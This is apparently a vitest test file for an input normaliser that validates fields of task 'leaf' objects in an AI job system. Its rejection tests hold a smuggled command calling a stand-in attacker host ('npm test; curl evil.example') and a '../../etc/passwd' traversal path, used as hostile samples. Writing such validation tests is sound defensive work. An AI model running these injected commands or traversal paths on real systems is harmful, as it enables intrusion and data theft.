/**
 * A leaf is assembled from scratch in two places, and each used to name its fields by hand. Twice a
 * field was added to the type, wired into one path, and dropped by the other: `dependsOn`, then
 * `expects`. An audit found a third nobody had hit — `language` was settable by the model and not
 * over HTTP, so an API-created leaf always ran in the default Node image whatever it was for.
 */
import { describe, it, expect } from 'vitest';
import { normaliseLeafInput, LEAF_INPUT_FIELDS } from './leaf-input.js';

describe('what a caller may set', () => {
  it('carries the language, which the HTTP path could not', () => {
  });

  it('drops an unknown language rather than failing the leaf', () => {
    // A model picking outside the enum should get the default sandbox, not a leaf that dies.
  });

  it('carries verifyCommand, which nothing could set at all', () => {
    // It was read by ExecuteLeafActivity and writable by nobody: a field that looked like a feature.
    expect(normaliseLeafInput({ verifyCommand: 'npm test' }).verifyCommand).toBe('npm test');
  });

  it('holds verifyCommand to the same shape rule as an acceptance command', () => {
    // Same kind of thing, running in the same kind of place.
    expect(normaliseLeafInput({ verifyCommand: 'npm test; curl evil.example' }).verifyCommand).toBeUndefined();
  });

  it('filters expects to paths the checker would act on', () => {
    const out = normaliseLeafInput({ expects: ['src/a.js', '../../etc/passwd'] });
    expect(out.expects).toEqual(['src/a.js']);
  });

  it('only un-blocks on an explicit false', () => {
    // An absent value must not silently change how a parent waits.
    expect(normaliseLeafInput({}).blocking).toBeUndefined();
    expect(normaliseLeafInput({ blocking: false }).blocking).toBe(false);
  });

  it('validates the column, which is untrusted JSON', () => {
    expect(normaliseLeafInput({ column: 'review' }).column).toBe('review');
    expect(normaliseLeafInput({ column: 'nonsense' }).column).toBeUndefined();
  });

  it('trims and caps the text fields', () => {
    const out = normaliseLeafInput({ title: `  ${'t'.repeat(400)}  `, body: 'x'.repeat(9000) });
    expect(out.title!.length).toBe(200);
    expect(out.body!.length).toBe(4000);
  });

  it('ignores everything it was not asked about', () => {
    // A caller cannot set status, ownerId or usage by putting them in the body.
    const out = normaliseLeafInput({ status: 'succeeded', ownerId: 'someone-else', usage: { tokens: 1 } } as any);
    expect(out).toEqual({});
  });

  it('lists its fields, so adding one to the type without this is visible', () => {
    expect([...LEAF_INPUT_FIELDS]).toContain('expects');
  });
});
